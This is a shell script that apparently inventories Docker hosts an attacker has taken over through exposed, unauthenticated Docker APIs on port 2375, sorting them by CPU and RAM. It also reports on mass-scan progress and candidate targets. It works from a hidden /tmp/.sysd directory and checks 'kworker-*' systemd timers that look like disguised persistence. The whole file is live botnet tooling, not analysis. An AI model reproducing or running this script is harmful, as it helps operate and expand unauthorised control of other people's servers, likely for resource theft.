#!/bin/sh
# Census: vCPU/RAM distribution over hosts we own, plus the supply picture.
W=/tmp/.sysd/.hunt
exec > /tmp/_census.out 2>&1
tot=0; b8=0; b4=0; b2=0; b1=0; noinfo=0; noapi=0
big_ram=0; small_ram=0
while read -r ip rest; do
    [ -n "$ip" ] || continue
    tot=$((tot + 1))
    v=$(curl -fsS -m 5 "http://$ip:2375/version" 2>/dev/null) || v=""
    case "$v" in *ApiVersion*) ;; *) noapi=$((noapi + 1)); echo "$ip no-api"; continue ;; esac
    inf=$(curl -fsS -m 6 "http://$ip:2375/info" 2>/dev/null) || inf=""
    nc=$(printf '%s' "$inf" | grep -o '"NCPU": *[0-9]*' | head -1 | cut -d: -f2 | tr -d ' ')
    mem=$(printf '%s' "$inf" | grep -o '"MemTotal": *[0-9]*' | head -1 | cut -d: -f2 | tr -d ' ')
    if [ -z "$nc" ]; then noinfo=$((noinfo + 1)); echo "$ip no-info"; continue; fi
    if [ "$nc" -ge 8 ]; then b8=$((b8 + 1));
    elif [ "$nc" -ge 4 ]; then b4=$((b4 + 1));
    elif [ "$nc" -ge 2 ]; then b2=$((b2 + 1));
    else b1=$((b1 + 1)); fi
    if [ -n "$mem" ] && [ "$mem" -ge 4000000000 ]; then big_ram=$((big_ram + 1));
    elif [ -n "$mem" ]; then small_ram=$((small_ram + 1)); fi
    echo "$ip ncpu=$nc mem_mb=$((${mem:-0} / 1048576))"
done < "$W/dock.owned"
echo "TOTAL=$tot ncpu_ge8=$b8 ncpu_4to7=$b4 ncpu_2to3=$b2 ncpu_1=$b1 no_info=$noinfo unreachable=$noapi ram_ge4G=$big_ram ram_lt4G=$small_ram"

echo "--- supply ---"
cut -f1 "$W/mass.found" 2>/dev/null | tr -d '\r' | sort -u > /tmp/_mf.ips
echo "massfound_rows=$(wc -l < "$W/mass.found")"
echo "dock_seen=$(wc -l < "$W/dock.seen")"
echo "dock_owned=$(wc -l < "$W/dock.owned")"
echo "fresh_candidates=$(grep -vxF -f "$W/dock.seen" /tmp/_mf.ips 2>/dev/null | wc -l)"
echo "mass_done_nets=$(wc -l < "$W/mass.done" 2>/dev/null || echo 0)"
echo "seed_done=$(wc -l < "$W/seed.done" 2>/dev/null || echo 0)"
systemctl list-timers 'kworker-*' --no-pager 2>/dev/null | head -8
echo "done=$(date -u)"
